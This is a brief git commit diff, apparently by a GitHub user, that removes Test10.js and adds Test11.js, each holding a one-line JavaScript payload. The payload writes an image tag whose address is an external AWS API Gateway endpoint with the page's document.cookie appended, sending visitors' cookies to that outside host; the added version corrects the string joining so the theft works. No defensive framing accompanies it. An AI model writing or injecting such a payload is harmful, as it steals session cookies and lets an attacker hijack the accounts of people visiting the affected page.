17e85647039b4607d60baacb008e4d58f95056bf
Soren-netka <75098777+Soren-netka@users.noreply.github.com>
2023-02-03 03:32:36 -0500

    1

--- Test10.js
+++
@@ -1,1 +0,0 @@
-document.write("<img src=https://1dczr9vl49.execute-api.us-east-2.amazonaws.com/gateway/Cookies + document.cookie + >");
---
+++ Test11.js
@@ -0,0 +1,2 @@
+const cookie1 = document.cookie
+document.write("<img src=https://1dczr9vl49.execute-api.us-east-2.amazonaws.com/gateway/Cookies" + cookie1 + ">");
